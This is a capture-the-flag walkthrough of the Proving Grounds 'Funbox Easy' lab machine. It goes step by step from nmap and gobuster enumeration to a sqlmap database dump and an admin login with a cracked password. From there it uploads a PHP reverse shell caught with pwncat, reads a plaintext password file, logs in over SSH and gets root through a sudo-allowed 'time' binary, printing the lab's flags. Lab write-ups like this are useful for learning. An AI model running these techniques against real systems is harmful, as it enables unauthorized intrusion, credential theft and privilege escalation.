# Funbox Easy

*Crenata | Monday, October 25th, 2021*

***Link*** : [https://portal.offensive-security.com/proving-grounds/play](https://portal.offensive-security.com/proving-grounds/play)

---------------------------------

### Nmap Scan

Docs : [https://nmap.org/docs.html](https://nmap.org/docs.html)

- ***Initial***

```
nmap -sC -sV -oN nmap 192.168.171.111
```

```
# Nmap 7.91 scan initiated Mon Oct 25 18:13:53 2021 as: nmap -sC -sV -oN nmap/initial 192.168.171.111
Nmap scan report for 192.168.171.111
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 25 18:14:36 2021 -- 1 IP address (1 host up) scanned in 43.81 seconds
```

- ***All Ports***

```
nmap -v -p- -oN all-ports 192.168.171.111
```

```
# Nmap 7.91 scan initiated Mon Oct 25 18:16:14 2021 as: nmap -v -p- -oN nmap/all-ports 192.168.171.111
Increasing send delay for 192.168.171.111 from 0 to 5 due to 84 out of 279 dropped probes since last increase.
Nmap scan report for 192.168.171.111
Host is up (0.25s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Oct 25 18:24:37 2021 -- 1 IP address (1 host up) scanned in 502.99 seconds
```

---------------------------------

### Visit The Website

```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

- ***Visit The URL***

```
http://192.168.171.111/
```

![http://192.168.171.111/](/images/1.png)

- ***Visit /robots.txt***

```
http://192.168.171.111/robots.txt
```

```
Disallow: gym
```

- ***Visit /gym***

```
http://192.168.171.111/gym/
```

![http://192.168.171.111/gym/](/images/2.png)

---------------------------------

### Gobuster Scan

Docs : [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)

- ***Root Scan***

```
gobuster dir -u http://192.168.171.111/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory-list-2.3-medium.log
```

```
/store         (Status: 301) [Size: 318] [--> http://192.168.171.111/store/]
/admin         (Status: 301) [Size: 318] [--> http://192.168.171.111/admin/]
/secret        (Status: 301) [Size: 319] [--> http://192.168.171.111/secret/]
```

- ***Visit The Store Page***

```
http://192.168.171.111/store/
```

![http://192.168.171.111/store/](/images/3.png)

- ***Visit The Book Page***

```
http://192.168.171.111/store/book.php?bookisbn=978-1-49192-706-9
```

![http://192.168.171.111/store/book.php?bookisbn=978-1-49192-706-9](/images/4.png)

---------------------------------

### Sqlmap

Docs : [https://github.com/sqlmapproject/sqlmap/wiki](https://github.com/sqlmapproject/sqlmap/wiki)

```
sqlmap -u 'http://192.168.171.111/store/book.php?bookisbn=978-1-49192-706-9' --batch --dump
```

```
[19:33:05] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[19:33:05] [INFO] starting 4 processes 
[19:33:08] [INFO] cracked password 'admin' for hash 'd033e22ae348aeb5660fc2140aec35850c4da997'
Database: store                                                                
Table: admin
[1 entry]
+-------+--------------------------------------------------+
| name  | pass                                             |
+-------+--------------------------------------------------+
| admin | d033e22ae348aeb5660fc2140aec35850c4da997 (admin) |
+-------+--------------------------------------------------+
```

- ***Visit Admin Login***

```
http://192.168.171.111/store/admin.php
```

```
Name : admin
Pass : admin
```

- ***Add New Book***

```
http://192.168.171.111/store/admin_add.php
```

![http://192.168.171.111/store/admin_add.php](/images/5.png)

1. Check IP

```
ip a s tun0
```

2. Change "***php-reverse-shell.php***" ***IP*** and ***Port***
3. Upload and submit the book
4. Use ***pwncat*** command to listen

```
pwncat -l 9999
```

5. Visit the book

```
http://192.168.171.111/store/book.php?bookisbn=342-432-545-2
```

6. ***pwncat*** command will receive connection

```
Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:00:04 up 22 min,  0 users,  load average: 0.06, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
tony
$ cd tony	
$ ls
password.txt
$ cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
$ 
```

---------------------------------

### SSH

```
$ ssh tony@192.168.171.111
The authenticity of host '192.168.171.111 (192.168.171.111)' can't be established.
ECDSA key fingerprint is SHA256:lDqW7tOK4ZCIRla+OSX6KVPDsRFL04w865Q2Q7MR7+k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.171.111' (ECDSA) to the list of known hosts.
tony@192.168.171.111's password: yxcvbnmYYY

tony@funbox3:~$ sudo su
[sudo] password for tony: 
Sorry, user tony is not allowed to execute '/usr/bin/su' as root on funbox3.
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD:
        /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
tony@funbox3:~$ sudo /usr/bin/time /bin/sh
# whoami
root
# cd /root/
# ls
proof.txt  root.flag  snap
# cat root.flag
Your flag is in another file...
# cat proof.txt
9d293ae9c0ad5e7d6829cc7f66f76bf2
# find / -name local.txt 2>/dev/null
/var/www/local.txt
# cat /var/www/local.txt
f18664d70768608ca1cd16dcb4fa8805
#
```